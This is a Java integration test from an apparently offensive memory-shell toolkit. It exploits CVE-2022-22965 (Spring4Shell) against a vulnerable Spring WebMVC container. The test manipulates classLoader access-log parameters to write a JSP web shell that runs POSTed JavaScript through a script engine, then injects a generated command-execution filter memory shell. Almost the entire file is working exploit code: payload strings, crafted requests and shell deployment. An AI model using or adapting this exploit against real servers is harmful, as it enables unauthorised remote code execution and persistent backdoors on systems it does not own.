package com.reajason.javaweb.integration.memshell.springwebmvc;

import com.reajason.javaweb.Server;
import com.reajason.javaweb.integration.ShellAssertion;
import com.reajason.javaweb.memshell.MemShellResult;
import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.ShellToolConfig;
import com.reajason.javaweb.packer.Packers;
import lombok.SneakyThrows;
import lombok.extern.slf4j.Slf4j;
import net.bytebuddy.jar.asm.Opcodes;
import okhttp3.*;
import org.apache.commons.lang3.tuple.Pair;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.testcontainers.containers.GenericContainer;
import org.testcontainers.containers.wait.strategy.Wait;
import org.testcontainers.junit.jupiter.Container;
import org.testcontainers.junit.jupiter.Testcontainers;

import java.time.Duration;
import java.util.Objects;

import static org.junit.jupiter.api.Assertions.assertNotEquals;

/**
 * @author ReaJason
 * @since 2026/7/16
 */
@Testcontainers
@Slf4j
public class CVE202222965Test {

    private static final OkHttpClient CLIENT = new OkHttpClient();
    private static final String JSP_PATTERN = "%{c2}i { " +
            "StringBuilder script = new StringBuilder(); " +
            "String line; " +
            "java.io.BufferedReader reader = request.getReader(); " +
            "while ((line = reader.readLine()) != null) { script.append(line).append('\\n'); } " +
            "javax.script.ScriptEngine engine = new javax.script.ScriptEngineManager().getEngineByName(\"js\"); " +
            "if (engine == null) { throw new IllegalStateException(\"js engine is null\"); } " +
            "Object result = engine.eval(script.toString()); " +
            "if (result != null) { out.print(result); } " +
            "} %{suffix}i";

    @Container
    public static final GenericContainer<?> cve202222965 =
            new GenericContainer<>("vulhub/spring-webmvc:5.3.17")
                    .withExposedPorts(8080)
                    .waitingFor(Wait.forHttp("/")
                            .withStartupTimeout(Duration.ofMinutes(3)));

    @Test
    @DisplayName("CVE-2022-22965")
    void CVE_2022_22965() {
        String url = getUrl();
        String jsEngineJspUrl = writeJsEngineJsp(url);
        assertJsEngineJspIsReady(jsEngineJspUrl);
        clearAccessLogPattern(url);

        String shellType = ShellType.FILTER;
        String shellTool = ShellTool.Command;
        Packers packer = Packers.ScriptEngine;
        Pair<String, String> urls = ShellAssertion.getUrls(url, shellType, shellTool, packer);
        ShellToolConfig shellToolConfig = ShellAssertion.getShellToolConfig(shellType, shellTool, packer);
        MemShellResult generateResult = ShellAssertion.generate(
                urls.getRight(),
                Server.Tomcat,
                null,
                shellType,
                shellTool,
                Opcodes.V11,
                shellToolConfig,
                packer);

        executeScript(jsEngineJspUrl, packer.getInstance().pack(generateResult.toClassPackerConfig()));
        ShellAssertion.assertShellIsOk(generateResult, urls.getLeft(), shellTool, shellType, null, null);
    }

    @SneakyThrows
    private String writeJsEngineJsp(String url) {
        HttpUrl exploitUrl = Objects.requireNonNull(HttpUrl.parse(url)).newBuilder()
                .addQueryParameter("class.module.classLoader.resources.context.parent.pipeline.first.pattern", JSP_PATTERN)
                .addQueryParameter("class.module.classLoader.resources.context.parent.pipeline.first.suffix", ".jsp")
                .addQueryParameter("class.module.classLoader.resources.context.parent.pipeline.first.directory", "webapps/ROOT")
                .addQueryParameter("class.module.classLoader.resources.context.parent.pipeline.first.prefix", "memshellparty")
                .addQueryParameter("class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat", "")
                .addQueryParameter("class.module.classLoader.resources.context.parent.pipeline.first.buffered", "false")
                .build();
        Request request = new Request.Builder()
                .url(exploitUrl)
                .header("c2", "<%")
                .header("suffix", "%>//")
                .build();
        try (Response response = CLIENT.newCall(request).execute()) {
            assertNotEquals(404, response.code());
        }
        writeJsEngineJspAccessLog(url);
        return url + "/memshellparty.jsp";
    }

    @SneakyThrows
    private void writeJsEngineJspAccessLog(String url) {
        Request request = new Request.Builder()
                .url(url)
                .header("c2", "<%")
                .header("suffix", "%>//")
                .build();
        try (Response response = CLIENT.newCall(request).execute()) {
            assertNotEquals(404, response.code());
        }
    }

    @SneakyThrows
    private void assertJsEngineJspIsReady(String jsEngineJspUrl) {
        for (int i = 0; i < 10; i++) {
            Request request = new Request.Builder()
                    .url(jsEngineJspUrl)
                    .header("c2", "<%")
                    .header("suffix", "%>//")
                    .post(RequestBody.create("1 + 1", MediaType.parse("text/plain")))
                    .build();
            try (Response response = CLIENT.newCall(request).execute()) {
                if (response.code() == 200 && Objects.requireNonNull(response.body()).string().contains("2")) {
                    return;
                }
            }
            Thread.sleep(500);
        }
    }

    @SneakyThrows
    private void executeScript(String jsEngineJspUrl, String script) {
        Request request = new Request.Builder()
                .url(jsEngineJspUrl)
                .post(RequestBody.create(script, MediaType.parse("text/plain")))
                .build();
        try (Response response = CLIENT.newCall(request).execute()) {
            assertNotEquals(404, response.code());
            assertNotEquals(500, response.code(), response.body().string());
        }
    }

    @SneakyThrows
    private void clearAccessLogPattern(String url) {
        HttpUrl resetUrl = Objects.requireNonNull(HttpUrl.parse(url)).newBuilder()
                .addQueryParameter("class.module.classLoader.resources.context.parent.pipeline.first.pattern", "")
                .build();
        Request request = new Request.Builder()
                .url(resetUrl)
                .build();
        try (Response response = CLIENT.newCall(request).execute()) {
            assertNotEquals(404, response.code());
        }
    }

    private static String getUrl() {
        String host = cve202222965.getHost();
        int port = cve202222965.getMappedPort(8080);
        String url = "http://" + host + ":" + port;
        log.info("container started, app url is : {}", url);
        return url;
    }
}
